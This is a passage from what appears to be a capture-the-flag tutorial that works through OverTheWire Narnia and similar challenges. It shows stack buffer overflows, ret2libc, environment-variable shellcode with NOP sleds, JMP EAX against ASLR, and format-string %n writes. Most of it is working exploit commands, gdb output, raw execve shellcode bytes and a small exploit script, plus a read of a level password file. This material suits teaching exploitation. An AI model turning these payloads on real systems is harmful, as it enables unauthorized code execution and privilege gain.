   0x080486e4 &lt;+348&gt;:   mov    DWORD PTR [esp],0x1
   0x080486eb &lt;+355&gt;:   call   0x8048450 &lt;exit@plt&gt;
End of assembler dump.
gdb-peda$ br *main+346
Breakpoint 1 at 0x80486e2: file narnia6.c, line 48.
gdb-peda$ run `python -c &#39;print &quot;A&quot;*8 + &quot;BBBB&quot; + &quot; &quot; + &quot;C&quot;*8 + &quot;DDDD&quot;&#39;`
[-------------------------------------code-------------------------------------]
   0x80486d7 &lt;main+335&gt;:    lea    eax,[esp+0x20]
   0x80486db &lt;main+339&gt;:    mov    DWORD PTR [esp],eax
   0x80486de &lt;main+342&gt;:    mov    eax,DWORD PTR [esp+0x28]
=&gt; 0x80486e2 &lt;main+346&gt;:    call   eax
   0x80486e4 &lt;main+348&gt;:    mov    DWORD PTR [esp],0x1
   0x80486eb &lt;main+355&gt;:    call   0x8048450 &lt;exit@plt&gt;
   0x80486f0 &lt;__libc_csu_fini&gt;: push   ebp
   0x80486f1 &lt;__libc_csu_fini+1&gt;:   mov    ebp,esp
Guessed arguments:
arg[0]: 0xffffd380 (&quot;DDDD&quot;)
Breakpoint 1, 0x080486e2 in main (argc=0x3, argv=0xffffd444) at narnia6.c:48
48      fp(b1);
gdb-peda$ p b1
$1 = &quot;DDDD\000AAA&quot;
gdb-peda$ p b2
$2 = &quot;CCCCCCCC&quot;
gdb-peda$ p puts
$3 = {&lt;text variable, no debug info&gt;} 0xf7eb3360 &lt;puts&gt;
gdb-peda$ p system
$4 = {&lt;text variable, no debug info&gt;} 0xf7e8bc30 &lt;system&gt;
gdb-peda$ p &amp;b1
$5 = (char (*)[8]) 0xffffd380
gdb-peda$ x/50xw 0xffffd350
0xffffd360: 0xffffd380  0xffffd5df  0x0000003b  0x0804874b
0xffffd370: 0x00000003  0xffffd444  0x43434343  0x43434343
0xffffd380: 0x44444444  0x41414100  0x42424242  0x00000000
0xffffd390: 0x08048700  0xf7fb0ff4  0xffffd418  0xf7e66e46
0xffffd3a0: 0x00000003  0xffffd444  0xffffd454  0xf7fde860
gdb-peda$ p fp
$6 = (int (*)(char *)) 0x42424242
gdb-peda$ p &amp;fp
$7 = (int (**)(char *)) 0xffffd388
gdb-peda$ p $fp
$8 = (void *) 0xffffd398
</pre></div>
</div>
<p>The address of fp “p &amp;fp” is 0xffffd3888 which has a value of (“p fp”) 0x42424242. As previously the stack is NoteXecutable, but stdlib.h is included in the C Program. Stdlib.h includes system call which has an address of (“p system”) 0xf7e8bc30. Further DDDD overwrites AAAA with the Null byte.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>narnia6@melinda:/narnia$ ./narnia6 `python -c &#39;print &quot;A&quot;*8 + &quot;\x40\x1c\xe6\xf7&quot; + &quot; &quot; + &quot;C&quot;*8 + &quot;/bin/sh&quot;&#39;`
$ cat /etc/narnia_pass/narnia7
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Let’s see another example where we have to use a environment variable to invoke a shell Narnia8.</li>
</ul>
<blockquote>
<div><div class="code c highlight-None notranslate"><div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
// gcc&#39;s variable reordering fucked things up
// to keep the level in its old style i am
// making &quot;i&quot; global unti i find a fix
// -morla
int i;

void func(char *b){
    char *blah=b;
    char bok[20];
    //int i=0;

    memset(bok, &#39;\0&#39;, sizeof(bok));
    for(i=0; blah[i] != &#39;\0&#39;; i++)
        bok[i]=blah[i];

    printf(&quot;%s\n&quot;,bok);
}

int main(int argc, char **argv){

    if(argc &gt; 1)
        func(argv[1]);
    else
    printf(&quot;%s argument\n&quot;, argv[0]);

    return 0;
}
</pre></div>
</div>
<p>Let’s see what is happening here: for loop in function func copies data from blah to bok character array until a null character is found. Let’s see how the stack would look like</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&lt;bok character array&gt;&lt;blah pointer&gt;&lt;fp&gt;&lt;ret&gt;&lt;pointer b&gt;
</pre></div>
</div>
<p>Let’s confirm this by using gdb? We put an breakpoint on printf function in the func function.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>0xffffd670: 0x08048580  0xffffd688  0x00000014  0xf7e54f53
0xffffd680: 0x00000000  0x00ca0000  0x41414141  0x41414141
0xffffd690: 0x41414141  0x41414141  0x00414141  0xffffd8b1
0xffffd6a0: 0x00000002  0xffffd764  0xffffd6c8  0x080484cd
0xffffd6b0: 0xffffd8b1  0xf7ffd000  0x080484fb  0xf7fca000
</pre></div>
</div>
<p>Address 0xffffd689 marks the start of the character buffer bok. I entered 19 A so it’s 0x41 19 times followed by null 0x00. Followed by that is 0xffffd8b1 (Value of Blah pointer). Followed by fp 12 bytes &lt;0x00000002 0xffffd764 0xffffd6c8&gt;. Followed by 0x080484cd which is the return address</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) x/s 0x080484cd
0x80484cd &lt;main+31&gt;:    &quot;\353\025\213E\f\213&quot;
</pre></div>
</div>
<p>followed by pointer b (0xffffd8b1). Let’s see what’s at location 0xffffd8b1</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) x/20wx 0xffffd8b1
0xffffd8b1: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd8c1: 0x00414141  0x5f474458  0x53534553  0x5f4e4f49
</pre></div>
</div>
<p>Let’s see what happens when we try to enter more than the 19 character (buffer size of bok - 1 byte (for null character))</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>narnia8@melinda:/narnia$ ./narnia8 `python -c &#39;print &quot;A&quot;*20&#39;`
AAAAAAAAAAAAAAAAAAAA����
narnia8@melinda:/narnia$ ./narnia8 `python -c &#39;print &quot;A&quot;*20&#39;` | hexdump
0000000 4141 4141 4141 4141 4141 4141 4141 4141
0000010 4141 4141 d8bf ffff 0a02
000001a
</pre></div>
</div>
<p>As expected, we get A followed by some garbage. which is the address where blah is pointing. We know that we can overwrite the RET address by</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span># `python -c &#39;print &quot;A&quot;*20 + &quot;\x90\x90\x90\x90&quot; + &quot;A&quot;*12 + &quot;BBBB&quot;&#39;`
</pre></div>
</div>
<p>Let’s see what happens when we do this. After copying 20 A it copies x90 and makes blah pointer from 0xffffd8bf to 0xffffd890. Because of the for loop</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>for(i=0; blah[i] != &#39;\0&#39;; i++)
</pre></div>
</div>
<p>It now copies the character from 0xffffd890 reference i.e 0xffffd890 + i value. Suppose it copied the character 0x41. The address becomes 0xffff4190 and now for loop searches from that address until a null character is found.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) x/20xw $esp
0xffffd660: 0xffffd678  0x00000000  0x00000014  0xf7e54f53
0xffffd670: 0x00000000  0x00ca0000  0x41414141  0x41414141
0xffffd680: 0x41414141  0x41414141  0x41414141  0xffffd890
0xffffd690: 0x00000002  0xffffd754  0xffffd6b8  0x080484cd
0xffffd6a0: 0xffffd89c  0xf7ffd000  0x080484fb  0xf7fca000

(gdb) x/10xw 0xffffd890
0xffffd890: 0x2f61696e  0x6e72616e  0x00386169  0x41414141
0xffffd8a0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd8b0: 0x90909090  0x41414141

(gdb) x/20xw $esp
0xffffd660: 0x08048580  0xffffd678  0x00000014  0xf7e54f53
0xffffd670: 0x00000000  0x00ca0000  0x41414141  0x41414141
0xffffd680: 0x41414141  0x41414141  0x41414141  0xffff4190
0xffffd690: 0x00000002  0xffffd754  0xffffd6b8  0x080484cd
0xffffd6a0: 0xffffd89c  0xf7ffd000  0x080484fb  0xf7fca000

(gdb) x/10xw 0xffff4190
0xffff4190: 0x00000000  0x00000000  0x00000000  0x00000000
0xffff41a0: 0x00000000  0x00000000  0x00000000  0x00000000
0xffff41b0: 0x00000000  0x00000000
</pre></div>
</div>
<p>If we can somehow keep/change the blah pointer back to it’s original value we may overwrite the RET pointer (after 12 bytes). Let’s see how 0xffffd89c looks when is used</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>`python -c &#39;print &quot;A&quot;*20 + &quot;\x90\x90\x90\x90&quot; + &quot;A&quot;*12 + &quot;BBBB&quot;&#39;`
</pre></div>
</div>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) x/30xw 0xffffd89c
0xffffd89c: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd8ac: 0x41414141  0x90909090  0x41414141  0x41414141
0xffffd8bc: 0x41414141  0x42424242  0x47445800  0x5345535f
</pre></div>
</div>
<p>When we used the below with the address, we were able to overwrite the RET by BBBB. Now, we control the EIP :)</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) run `python -c &#39;print &quot;A&quot;*20 + &quot;\x9c\xd8\xff\xff&quot; + &quot;A&quot;*12 + &quot;BBBB&quot;&#39;`


(gdb) x/20xw $esp
0xffffd660: 0x08048580  0xffffd678  0x00000014  0xf7e54f53
0xffffd670: 0x00000000  0x00ca0000  0x41414141  0x41414141
0xffffd680: 0x41414141  0x41414141  0x41414141  0xffffd89c
0xffffd690: 0x41414141  0x41414141  0x41414141  0x42424242
</pre></div>
</div>
<p>Let’s export a shellcode using a environment variable check it’s address on the stack and redirect the flow of our code to it. Notice the number of NOPs we have put for easy identification plus reachability.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>export EGG=`python -c &#39;print &quot;\x90&quot;*90 + &quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;&#39;`
</pre></div>
</div>
<p>Searching our environment variable we get it at address 0xffffd8d4.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) x/100xw $esp+500
0xffffd7e4: 0x0000000f  0xffffd80b  0x00000000  0x00000000
0xffffd7f4: 0x00000000  0xde000000  0x1a2a5992  0xf11444ea
0xffffd804: 0x11433cf3  0x694a71a2  0x00363836  0x672f0000
0xffffd814: 0x73656d61  0x72616e2f  0x2f61696e  0x6e72616e
0xffffd824: 0x00386169  0x41414141  0x41414141  0x41414141
0xffffd834: 0x41414141  0x41414141  0xffffd828  0x41414141
0xffffd844: 0x41414141  0x41414141  0x42424242  0x47445800
0xffffd854: 0x5345535f  0x4e4f4953  0x3d44495f  0x35343239
0xffffd864: 0x45485300  0x2f3d4c4c  0x2f6e6962  0x68736162
0xffffd874: 0x52455400  0x74783d4d  0x006d7265  0x5f485353
0xffffd884: 0x45494c43  0x353d544e  0x34392e39  0x2e31362e
0xffffd894: 0x20343731  0x37373835  0x32322032  0x48535300
0xffffd8a4: 0x5954545f  0x65642f3d  0x74702f76  0x31312f73
0xffffd8b4: 0x5f434c00  0x3d4c4c41  0x47450043  0x90903d47
0xffffd8c4: 0x90909090  0x90909090  0x90909090  0x90909090
0xffffd8d4: 0x90909090  0x90909090  0x90909090  0x90909090
0xffffd8e4: 0x90909090  0x90909090  0x90909090  0x90909090
0xffffd8f4: 0x90909090  0x90909090  0x90909090  0x90909090
0xffffd904: 0x90909090  0x90909090  0x90909090  0x90909090
0xffffd914: 0x90909090  0x90909090  0x99580b6a  0x2f2f6852
0xffffd924: 0x2f686873  0x896e6962  0xcdc931e3  0x53550080
0xffffd934: 0x6e3d5245  0x696e7261  0x4c003861  0x4f435f53
0xffffd944: 0x53524f4c  0x3d73723d  0x69643a30  0x3b31303d
</pre></div>
</div>
<p>Let’s redirect our program to 0xffffd8d4 to get the shell</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) run `python -c &#39;print &quot;A&quot;*20 + &quot;\x28\xd8\xff\xff&quot; + &quot;A&quot;*12 + &quot;\xd4\xd8\xff\xff&quot;&#39;`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /games/narnia/narnia8 `python -c &#39;print &quot;A&quot;*20 + &quot;\x28\xd8\xff\xff&quot; + &quot;A&quot;*12 + &quot;\xd4\xd8\xff\xff&quot;&#39;`

Breakpoint 1, 0x080484a7 in func ()
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAA(���AAAAAAAAAAAA����(���
process 19900 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the &quot;file&quot; command.
Error in re-setting breakpoint 1: No symbol &quot;func&quot; in current context.
Error in re-setting breakpoint 1: No symbol &quot;func&quot; in current context.
Error in re-setting breakpoint 1: No symbol &quot;func&quot; in current context.
$
</pre></div>
</div>
<p>Trying this without gdb didn’t work because the address of character array changes</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>narnia8@melinda:/narnia$ ./narnia8 `python -c &#39;print &quot;A&quot;*20 + &quot;\x28\xd8\xff\xff&quot; + &quot;B&quot;*12 + &quot;\xd4\xd8\xff\xff&quot;&#39;`
AAAAAAAAAAAAAAAAAAAA(A��
narnia8@melinda:/narnia$ ./narnia8 `python -c &#39;print &quot;A&quot;*20 + &quot;\x28\xd8\xff\xff&quot; + &quot;B&quot;*12 + &quot;\xd4\xd8\xff\xff&quot;&#39;` | hexdump
0000000 4141 4141 4141 4141 4141 4141 4141 4141
0000010 4141 4141 4128 ffff 0a02
000001a
</pre></div>
</div>
<p>Changing 28 to 0a just by chance gave me the correct address to be pointed at</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>narnia8@melinda:/narnia$ ./narnia8 `python -c &#39;print &quot;A&quot;*20 + &quot;\x0a\xd8\xff\xff&quot; + &quot;B&quot;*12 + &quot;\xd4\xd8\xff\xff&quot;&#39;` | hexdump
0000000 4141 4141 4141 4141 4141 4141 4141 4141
0000010 4141 4141 d837 ffff 0a03
</pre></div>
</div>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>narnia8@melinda:/narnia$ ./narnia8 `python -c &#39;print &quot;A&quot;*20 + &quot;\x37\xd8\xff\xff&quot; + &quot;B&quot;*12 + &quot;\xd4\xd8\xff\xff&quot;&#39;`
AAAAAAAAAAAAAAAAAAAA7���BBBBBBBBBBBB����7���
$
</pre></div>
</div>
<p>For example, below you need the address of secret to write the new value 0x1337beef.</p>
<div class="code c highlight-None notranslate"><div class="highlight"><pre><span></span>unsigned secret = 0xdeadbeef;

int main(int argc, char **argv){
    unsigned *ptr;
    unsigned value;
    char key[33];
    FILE *f;
    printf(&quot;Welcome! I will grant you one arbitrary write!\n&quot;);
    printf(&quot;Where do you want to write to? &quot;);
    scanf(&quot;%p&quot;, &amp;ptr);
    printf(&quot;Okay! What do you want to write there? &quot;);
    scanf(&quot;%p&quot;, (void **)&amp;value);
    printf(&quot;Writing %p to %p...\n&quot;, (void *)value, (void *)ptr);
    *ptr = value;
    printf(&quot;Value written!\n&quot;);
    if (secret == 0x1337beef){
        printf(&quot;Woah! You changed my secret!\n&quot;);
        printf(&quot;I guess this means you get a flag now...\n&quot;);

        f = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
        fgets(key, 32, f);
        fclose(f);
        puts(key);
        exit(0);
    }
    printf(&quot;My secret is still safe! Sorry.\n&quot;);
}
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>In another challenge below, It can be easily seen the value of secret can be changed after entering 16 characters + 0xc0deface. As, 0xc0deface can’t be printed as ASCII characters, you can use python to pass the input.</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>python -c &#39; print &quot;A&quot; * 16 + &quot;\xc0\xde\xfa\xce&quot;&#39; or python -c &#39; print &quot;A&quot; * 16 + &quot;\xce\xfa\xde\xc0&quot;&#39; based on the endianess of the system.
</pre></div>
</div>
<div class="code C highlight-None notranslate"><div class="highlight"><pre><span></span>void give_shell(){
     gid\_t gid = getegid();
     setresgid(gid, gid,gid);
     system(&quot;/bin/sh -i&quot;); }

void vuln(char \*input){
     char buf[16];
     int secret = 0;
     strcpy(buf,input);

 if (secret == 0xc0deface){
     give_shell();
 }else{
     printf(&quot;The secret is %x\n&quot;, secret);
 }

}

int main(int argc, char \*\*argv)
{ if (argc &gt; 1)
     vuln(argv[1]);
     return 0; }
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Controlling the EIP: In the below challenge, an attacker can use a buffer overflow to take control of the program’s execution. the return address for the call to vuln function is above buf on the stack, so it can be overwritten with an overflow. this allows an attacker to put nearly any address they desire in place of the return address. in this example, the goal is to call the give_shell function.</li>
</ul>
<blockquote>
<div><ul class="simple">
<li>We need to find the address of give_shell function which can be done either by using gdb and print give_shell or objdump -d outputfile | grep give_shell.</li>
<li>To know the EIP offset, you can use cyclic patterns. Use pattern_create.rb and pattern_offset.rb So pattern_create.rb 100 for instance will create a 100 byte cyclic pattern.</li>
<li>Then you feed this as your input to the vulnerable program and it will crash. so get the value of EIP at that point.</li>
<li>Then, we just need to pass the input to the program by</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>./a.out $(python -c &#39; print &quot;A&quot; \* Offset + &quot;Address of give\_shell in hex&quot;&#39; )
</pre></div>
</div>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

/* This never gets called! */
void give_shell(){
     gid_t gid = getegid();
     setresgid(gid, gid, gid);
     system(&quot;/bin/sh -i&quot;);
}

void vuln(char *input){
     char buf[16];
     strcpy(buf, input);
}

int main(int argc, char **argv){
     if (argc &gt; 1)
        vuln(argv[1]);
        return 0;
}
</pre></div>
</div>
</div></blockquote>
</div></blockquote>
<ul class="simple">
<li>Execute Me: If you check the below code, getegid() function shall return the effective group ID of the calling process., setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process. If you see, read function read the stdin into the buffer and (function_ptf) buf() function is called which would call anything in the buffer.</li>
</ul>
<blockquote>
<div><ul>
<li><p class="first">Since, buf will execute anything, we need a shell code to fit in 128 bytes, There are plenty of shellcode (with different platforms and different working)which can be found on Shell-Storm.</p>
</li>
<li><p class="first">Then, we just need to pass the input to the program by</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>./a.out $(python -c &#39; print &quot;A&quot; \* Offset + &quot;Address of give\_shell in hex&quot;&#39; )
</pre></div>
</div>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int token = 0;

typedef void (*function_ptr)();

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char **argv){
         char buf[128];

         be_nice_to_people();
         read(0, buf, 128);
         ((function_ptr)buf)();
 }
</pre></div>
</div>
</li>
</ul>
</div></blockquote>
<ul class="simple">
<li>ROP1: This binary is running on a machine with ASLR! (Address space layout randomization (ASLR) is a computer security technique involved in protection from buffer overflow attacks.) Can you bypass it?</li>
</ul>
<blockquote>
<div><ul class="simple">
<li>From the code provided we can see that there’s a buffer overflow in the vuln() function due to the strcpy() call. run the program within gdb and see what the state of the registers and the stack are at the time of the crash.</li>
<li>From the cylic patterns tools, we could find that offset is at 76 which could be confirmed by providing a input of 76 “A”s and 4 “B”s to overwrite EIP. set a breakpoint after the call to strcpy(); that is *vuln+24. After the leave instruction is executed, EIP will be set to 0x424242.</li>
<li>EAX points to our buffer of “A”s and since the binary doesn’t have the NX bit, we can execute shellcode on the stack. To bypass ASLR, we just need to find an address that will do a JMP/CALL EAX and set that as our return address. msfelfscan can find a list of instructions to accomplish this:</li>
<li>Since the binary is compiled for 32 bit, searching the shellcode in Shellstorm for Linux_x86 executing /bin/sh, we get 21 bytes shellcode in kernelpanic.</li>
<li>As EAX contains the 76*A + BBBB when the vuln function returns, we just need to find address which will execute JMP EAX, it can be found by msfelfscan -j eax binary_file</li>
<li>One more small but important observation is the number of NOPs, as our shellcode is 21 bytes and offset is 76 bytes and jmp is 4 bytes. So, 76 - 21 - 4 = 51.</li>
</ul>
<blockquote>
<div><div class="code python highlight-None notranslate"><div class="highlight"><pre><span></span>import struct
code = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;
jmpeax = struct.pack(&quot;&lt;I&quot;,0x080483e7)
print &quot;\x90&quot;*51 + code + jmpeax
</pre></div>
</div>
<div class="code C highlight-None notranslate"><div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

void be_nice_to_people(){
     gid_t gid = getegid();
     setresgid(gid, gid, gid);
 }

void vuln(char *name){
     char buf[64];
     strcpy(buf, name);
}

int main(int argc, char **argv){
    be_nice_to_people();
    if(argc &gt; 1)
       vuln(argv[1]);
       return 0;
}
</pre></div>
</div>
</div></blockquote>
</div></blockquote>
</div>
<div class="section" id="format-string-examples">
<h2>Format String Examples<a class="headerlink" href="#format-string-examples" title="Permalink to this headline">¶</a></h2>
<p>Let’s see a simple example of a format string vulnerabilty.</p>
<ul class="simple">
<li>Narnia5</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>include &lt;stdio.h&gt;
include &lt;stdlib.h&gt;
include &lt;string.h&gt;

int main(int argc, char \*\*argv){
     int i = 1; char buffer[64];
     snprintf(buffer, sizeof buffer, argv[1]);
     buffer[sizeof (buffer) - 1] = 0;
     printf(&quot;Change i&#39;s value from 1 -&gt; 500. &quot;);

     if(i==500){
       printf(&quot;GOOD\n&quot;);
       system(&quot;/bin/sh&quot;);
     }

     printf(&quot;No way...let me give you a hint!\n&quot;);
     printf(&quot;buffer : [%s] (%d)\n&quot;, buffer, strlen(buffer));
     printf (&quot;i = %d (%p)\n&quot;, i, &amp;i);
     return 0;
}
</pre></div>
</div>
<p>Let’s try to see what’s on stack and if we can put something on stack and change the value of i.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>narnia5@melinda:~$ /narnia/narnia5
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x Change i&#39;s value from 1 -&gt; 500.
No way...let me give you a hint! buffer :
[f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.62653766.36656436.6666662e.] (63) i
= 1 (0xffffd6cc)

      narnia5@melinda:~$ /narnia/narnia5
      AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x Change i&#39;s value from 1 -&gt;
      500. No way...let me give you a hint! buffer :
      [AAAAf7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.41414141.62653766.36656] (63) i
      = 1 (0xffffd6cc)

      narnia5@melinda:~$ /narnia/narnia5
      ``python -c &#39;print &quot;\xcc\xd6\xff\xff%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x&quot;&#39;``
      Change i&#39;s value from 1 -&gt; 500. No way...let me give you a hint! buffer
      : [����f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8.ffffd6cc.62653766.36656] (63)
      i = 1 (0xffffd6cc)

      narnia5@melinda:~$ /narnia/narnia5
      ``python -c &#39;print &quot;\xcc\xd6\xff\xff%08x.%08x.%08x.%08x.%08n.%08x.%08x.%08x&quot;&#39;``
      Change i&#39;s value from 1 -&gt; 500. No way...let me give you a hint! buffer
      : [����f7eb6de6.ffffffff.ffffd6ae.f7e2ebf8..62653766.36656436.6666] (63)
      i = 40 (0xffffd6cc)

      narnia5@melinda:~$ /narnia/narnia5
      ``python -c &#39;print &quot;\xcc\xd6\xff\xff%08x.%08x.%08x.%468x.%08n.%08x.%08x.%08x&quot;&#39;``
      Change i&#39;s value from 1 -&gt; 500. GOOD $
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>In this example, let’s see use of arbitary writing an address Narnia7</li>
</ul>
<blockquote>
<div><div class="code c highlight-None notranslate"><div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf(&quot;goodfunction() = %p\n&quot;, goodfunction);
        printf(&quot;hackedfunction() = %p\n\n&quot;, hackedfunction);

        ptrf = goodfunction;
        printf(&quot;before : ptrf() = %p (%p)\n&quot;, ptrf, &amp;ptrf);

        printf(&quot;I guess you want to come to the hackedfunction...\n&quot;);
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc &lt;= 1){
                fprintf(stderr, &quot;Usage: %s &lt;buffer&gt;\n&quot;, argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf(&quot;Welcome to the goodfunction, but i said the Hackedfunction..\n&quot;);
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf(&quot;Way to go!!!!&quot;);
    fflush(stdout);
        system(&quot;/bin/sh&quot;);

        return 0;
}
</pre></div>
</div>
<p>If we see, the program provides us with the address of the ptrf pointer, goodfunction and bad function. The ptrf is assigned the address of goodfunction if we somehow change it to address of the badfunction, we can get a shell. Let’s run the program and see what are the address we get.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>./narnia71 A
goodfunction() = 0x804871f
hackedfunction() = 0x8048745

before : ptrf() = 0x804871f (0xffb4450c)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
</pre></div>
</div>
<p>and</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>narnia7@melinda:/narnia$ ./narnia7 A
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd64c)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
</pre></div>
</div>
<p>The reason I have added two running instances is because in the first instance the address is different by one byte 0x1f and 0x45 where as in the second instance the address differs by two bytes 0x86e0 and 0x8706. We can write two bytes by %hn and one byte by %hhn. We can write whole 4 byte address by following a formula</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>If HOB &lt; LOB

HOB:0x0804
LOB:0x8706

[addr+2][addr] = \x4e\xd6\xff\xff\x4c\xd6\xff\xff
%.[HOB - 8]x   = 0x804 - 8 = 7FC (2044) = %.2044x
%[offset]$hn   = %6\$hn
%.[LOB - HOB]x = 0x8706 - 0x804 = 7F02 (32514) = %.32514x
%[offset+1]$hn = %7\$hn

`python -c &#39;print &quot;\x4e\xd6\xff\xff\x4c\xd6\xff\xff&quot; +&quot;%.2044x%6\$hn %.32514x%7\$hn&quot;&#39;`
</pre></div>
</div>
<p>We also need to find the offset where the address is stored which can be done by two methods: Either compiling the program on local machine and checking the buffer just after snprintf</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>gdb-peda$ p buffer
$2 = &quot;AAAA.000008a2.f7fdeb58.f7fde860.0804835c.0804871f.41414141.3030302e.61383030&quot;, &#39;\000&#39; &lt;repeats 51 times&gt;
</pre></div>
</div>
<p>or by using ltrace</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>narnia7@melinda:/narnia$ ltrace ./narnia7 `python -c &#39;print &quot;AAAA&quot; + &quot;.%08x&quot;*7&#39;`
__libc_start_main(0x804868f, 2, 0xffffd764, 0x8048740 &lt;unfinished ...&gt;
memset(0xffffd620, &#39;\0&#39;, 128)                                                                                          = 0xffffd620
printf(&quot;goodfunction() = %p\n&quot;, 0x80486e0goodfunction() = 0x80486e0
)                                                                             = 27

)                                                                         = 30
printf(&quot;before : ptrf() = %p (%p)\n&quot;, 0x80486e0, 0xffffd61cbefore : ptrf() = 0x80486e0 (0xffffd61c)
)                                                           = 41
puts(&quot;I guess you want to come to the &quot;...I guess you want to come to the hackedfunction...
printf(&quot;hackedfunction() = %p\n\n&quot;, 0x8048706hackedfunction() = 0x8048706
)                                                                            = 50
sleep(2)                                                                                                               = 0
snprintf(&quot;AAAA.08048238.ffffd678.f7ffda94.&quot;..., 128, &quot;AAAA.%08x.%08x.%08x.%08x.%08x.%0&quot;..., 0x8048238, 0xffffd678, 0xf7ffda94, 0, 0x80486e0, 0x41414141, 0x3038302e) = 67
puts(&quot;Welcome to the goodfunction, but&quot;...Welcome to the goodfunction, but i said the Hackedfunction..
)                                                                            = 61
fflush(0xf7fcaac0)                                                                                                     = 0
exit(0 &lt;no return ...&gt;
+++ exited (status 0) +++
</pre></div>
</div>
<p>If you see 0x41414141 is at offset 6.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>gdb-peda$ p ptrf
$3 = (int (*)()) 0x804871f &lt;goodfunction&gt;
gdb-peda$ p &amp;ptrf
$4 = (int (**)()) 0xffffd2ec
gdb-peda$ x /10xb 0xfffd3ea
0xfffd3ea:  Cannot access memory at address 0xfffd3ea
gdb-peda$ x /10xb 0xffffd3ea
0xffffd3ea: 0x3f    0x77    0x00    0x00    0x00    0x00    0x00    0x00
0xffffd3f2: 0x00    0x00
gdb-peda$ x /10xb 0xffffd2ea
0xffffd2ea: 0x04    0x08    0x1f    0x87    0x04    0x08    0x41    0x41
0xffffd2f2: 0x41    0x41
gdb-peda$ p goodfunction
$5 = {int ()} 0x804871f &lt;goodfunction&gt;
gdb-peda$ p ha
hackedfunction  hasmntopt
gdb-peda$ p hackedfunction
$6 = {int ()} 0x8048745 &lt;hackedfunction&gt;
</pre></div>
</div>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>gdb-peda$ p &amp;ptrf
$10 = (int (**)()) 0xffffd2fc
gdb-peda$ run `python -c &#39;print &quot;\xfc\xd2\xff\xff&quot; + &quot;.%08x&quot;*5 + &quot;%hhn&quot;&#39;`
gdb-peda$ p ptrf
